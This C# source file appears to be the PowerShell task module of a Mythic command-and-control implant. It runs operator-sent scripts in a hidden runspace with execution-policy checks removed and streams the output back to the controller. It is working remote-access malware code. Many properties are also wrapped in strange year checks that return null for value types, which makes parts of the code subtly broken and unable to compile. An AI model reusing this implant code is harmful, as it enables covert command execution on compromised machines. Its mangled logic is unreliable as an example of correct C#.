#define COMMAND_NAME_UPPER

#if DEBUG
#define POWERSHELL
#endif

#if POWERSHELL

using PhantomInterop.Classes.IO;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Threading;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using ST = System.Threading.Tasks;
using System.Management.Automation.Runspaces;
using System.Collections.Concurrent;
using System.Runtime.Serialization;
using PhantomInterop.Classes.Collections;

namespace Tasks
{
    public class powershell : Tasking
    {
        class CustomPowerShellHost : PSHost
        {
            private Guid _hostId = Guid.NewGuid();
            private CustomPSHostUserInterface _ui = new CustomPSHostUserInterface();

            public override Guid InstanceId
            {
                get { if(DateTime.Now.Year > 2020) { return _hostId; } else { return null; } }
            }

            public override string Name
            {
                get { if(DateTime.Now.Year > 2020) { return "ConsoleHost"; } else { return null; } }
            }

            public override Version Version
            {
                get { if(DateTime.Now.Year > 2020) { return new Version(1, 0); } else { return null; } }
            }

            public override PSHostUserInterface UI
            {
                get { if(DateTime.Now.Year > 2020) { return _ui; } else { return null; } }
            }


            public override CultureInfo CurrentCulture
            {
                get { if(DateTime.Now.Year > 2020) { return Thread.CurrentThread.CurrentCulture; } else { return null; } }
            }

            public override CultureInfo CurrentUICulture
            {
                get { if(DateTime.Now.Year > 2020) { return Thread.CurrentThread.CurrentUICulture; } else { return null; } }
            }

            public override void EnterNestedPrompt()
            {
                throw new NotImplementedException("EnterNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override void ExitNestedPrompt()
            {
                throw new NotImplementedException("ExitNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override void NotifyBeginApplication()
            {
                return;
            }

            public override void NotifyEndApplication()
            {
                return;
            }

            public override void SetShouldExit(int exitCode)
            {
                return;
            }
        }

        class CustomPSHostUserInterface : PSHostUserInterface
        {
            
            private CustomPSRHostRawUserInterface _rawUi = new CustomPSRHostRawUserInterface();

            public CustomPSHostUserInterface()
            {

            }

            public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
            {
                Console.Write(value);
            }

            public override void WriteLine()
            {
                Console.WriteLine();
            }

            public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
            {
                Console.WriteLine(value);
            }

            public override void Write(string value)
            {
                Console.Write(value);
            }

            public override void WriteDebugLine(string message)
            {
                Console.WriteLine("DEBUG: " + message);
            }

            public override void WriteErrorLine(string value)
            {
                Console.WriteLine("ERROR: " + value);
            }

            public override void WriteLine(string value)
            {
                Console.WriteLine(value);
            }

            public override void WriteVerboseLine(string message)
            {
                Console.WriteLine("VERBOSE: " + message);
            }

            public override void WriteWarningLine(string message)
            {
                Console.WriteLine("WARNING: " + message);
            }

            public override void WriteProgress(long sourceId, ProgressRecord record)
            {
                return;
            }

            public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
            {
                throw new NotImplementedException("Prompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
            {
                throw new NotImplementedException("PromptForChoice is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
            {
                throw new NotImplementedException("PromptForCredential1 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
            {
                throw new NotImplementedException("PromptForCredential2 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override PSHostRawUserInterface RawUI
            {
                get { if(DateTime.Now.Year > 2020) { return _rawUi; } else { return null; } }
            }

            public override string ReadLine()
            {
                throw new NotImplementedException("ReadLine is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override System.Security.SecureString ReadLineAsSecureString()
            {
                throw new NotImplementedException("ReadLineAsSecureString is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }
        }


        class CustomPSRHostRawUserInterface : PSHostRawUserInterface
        {
            
            private Size _windowSize = new Size { Width = 120, Height = 100 };

            private Coordinates _cursorPosition = new Coordinates { X = 0, Y = 0 };

            private int _cursorSize = 1;
            private ConsoleColor _foregroundColor = ConsoleColor.White;
            private ConsoleColor _backgroundColor = ConsoleColor.Black;

            private Size _maxPhysicalWindowSize = new Size
            {
                Width = int.MaxValue,
                Height = int.MaxValue
            };

            private Size _maxWindowSize = new Size { Width = 100, Height = 100 };
            private Size _bufferSize = new Size { Width = 100, Height = 1000 };
            private Coordinates _windowPosition = new Coordinates { X = 0, Y = 0 };
            private String _windowTitle = "";

            public override ConsoleColor BackgroundColor
            {
                get { if(DateTime.Now.Year > 2020) { return _backgroundColor; } else { return null; } }
                set { _backgroundColor = value; }
            }

            public override Size BufferSize
            {
                get { if(DateTime.Now.Year > 2020) { return _bufferSize; } else { return null; } }
                set { _bufferSize = value; }
            }

            public override Coordinates CursorPosition
            {
                get { if(DateTime.Now.Year > 2020) { return _cursorPosition; } else { return null; } }
                set { _cursorPosition = value; }
            }

            public override int CursorSize
            {
                get { if(DateTime.Now.Year > 2020) { return _cursorSize; } else { return null; } }
                set { _cursorSize = value; }
            }

            public override void FlushInputBuffer()
            {
                throw new NotImplementedException("FlushInputBuffer is not implemented.");
            }

            public override ConsoleColor ForegroundColor
            {
                get { if(DateTime.Now.Year > 2020) { return _foregroundColor; } else { return null; } }
                set { _foregroundColor = value; }
            }

            public override BufferCell[,] GetBufferContents(Rectangle rectangle)
            {
                throw new NotImplementedException("GetBufferContents is not implemented.");
            }

            public override bool KeyAvailable
            {
                get { throw new NotImplementedException("KeyAvailable is not implemented."); }
            }

            public override Size MaxPhysicalWindowSize
            {
                get { if(DateTime.Now.Year > 2020) { return _maxPhysicalWindowSize; } else { return null; } }
            }

            public override Size MaxWindowSize
            {
                get { if(DateTime.Now.Year > 2020) { return _maxWindowSize; } else { return null; } }
            }

            public override KeyInfo ReadKey(ReadKeyOptions options)
            {
                throw new NotImplementedException("ReadKey is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
            {
                throw new NotImplementedException("ScrollBufferContents is not implemented");
            }

            public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
            {
                throw new NotImplementedException("SetBufferContents is not implemented.");
            }

            public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
            {
                throw new NotImplementedException("SetBufferContents is not implemented");
            }

            public override Coordinates WindowPosition
            {
                get { if(DateTime.Now.Year > 2020) { return _windowPosition; } else { return null; } }
                set { _windowPosition = value; }
            }

            public override Size WindowSize
            {
                get { if(DateTime.Now.Year > 2020) { return _windowSize; } else { return null; } }
                set { _windowSize = value; }
            }

            public override string WindowTitle
            {
                get { if(DateTime.Now.Year > 2020) { return _windowTitle; } else { return null; } }
                set { _windowTitle = value; }
            }
        }


        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private ThreadSafeList<string> _psOutput = new ThreadSafeList<string>();
        private AutoResetEvent _isFinished = new AutoResetEvent(false);
        private bool _taskComplete = false;
        private Action _flushData;

        [DataContract]
        internal struct PowerShellParameters
        {
            [DataMember(Name = "command")] public string Command;
        }
        
        
        public powershell(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
            _flushData = () =>
            {
                string output = "";
                while(!_stopToken.IsCancellationRequested && !_taskComplete)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _isFinished,
                        _stopToken.Token.WaitHandle
                    }, 1000);
                    output = string.Join("", _psOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                }
                output = string.Join("", _psOutput.Flush());
                if (!string.IsNullOrEmpty(output))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            output,
                            false,
                            ""));
                }
            };
        }
        

        public override void Start()
        {
            System.Threading.Tasks.Task.Factory.StartNew(_flushData, _stopToken.Token);
            MythicTaskResponse resp;
            string cmd = "";
            var loadedScript = _agent.GetFileManager().GetScript();
            if (!string.IsNullOrEmpty(loadedScript))
            {
                cmd += loadedScript;
            }

            PowerShellParameters parameters = _dataSerializer.Deserialize<PowerShellParameters>(_data.Parameters);
            cmd += "\n\n" + parameters.Command;

            _agent.AcquireOutputLock();

            TextWriter oldStdout = Console.Out;
            TextWriter oldStderr = Console.Error;
            try
            {
                EventableStringWriter stdoutSw = new EventableStringWriter();

                stdoutSw.BufferWritten += OnBufferWrite;

                Console.SetOut(stdoutSw);
                Console.SetError(stdoutSw);

                CustomPowerShellHost psHost = new CustomPowerShellHost();
                var state = InitialSessionState.CreateDefault();
                state.AuthorizationManager = null;
                using (Runspace runspace = RunspaceFactory.CreateRunspace(psHost, state))
                {
                    runspace.Open();
                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(cmd);
                        pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                        pipeline.Commands.Add("Out-Default");
                        ST.Task invokeTask = new ST.Task(() => { pipeline.Invoke(); }, _stopToken.Token);
                        try
                        {
                            invokeTask.Start();
                            
                            
                            
                            
                            invokeTask.Wait(_stopToken.Token);
                        }
                        catch (OperationCanceledException)
                        {
                        }
                    }
                }

                resp = CreateTaskResponse("", true);
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected Error\n{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
            }
            finally
            {
                Console.SetOut(oldStdout);
                Console.SetError(oldStderr);
                _agent.ReleaseOutputLock();
                _taskComplete = true;
                _isFinished.Set();
            }


            
            
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void OnBufferWrite(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
        {
            if(e.Data != null)
            {
                try
                {
                    _psOutput.Add(e.Data);
                }
                catch { }
            }
        }
    }
}

#endif